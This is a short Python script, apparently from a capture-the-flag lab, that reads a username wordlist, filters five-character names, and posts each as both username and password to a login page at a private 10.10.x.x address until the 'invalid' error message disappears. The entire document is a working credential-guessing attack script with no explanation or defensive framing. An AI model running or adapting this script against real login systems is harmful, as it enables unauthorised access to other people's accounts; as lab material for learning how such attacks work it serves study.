#!/usr/bin/python3

import requests

with open('/opt/userNameList/names.txt') as handler:
	names = handler.read().split('\n')


url = "http://10.10.255.243/users/login.php"

for name in names:
	if len(name) == 5:
		data = {"username": name,
				"password": name}
		print("Username: " + name)
		resp = requests.post(url, data=data)
		if not "The username/password combination you have entered is invalid" in resp.text:
			print("Found user name: " + name + "\n\n")
			exit()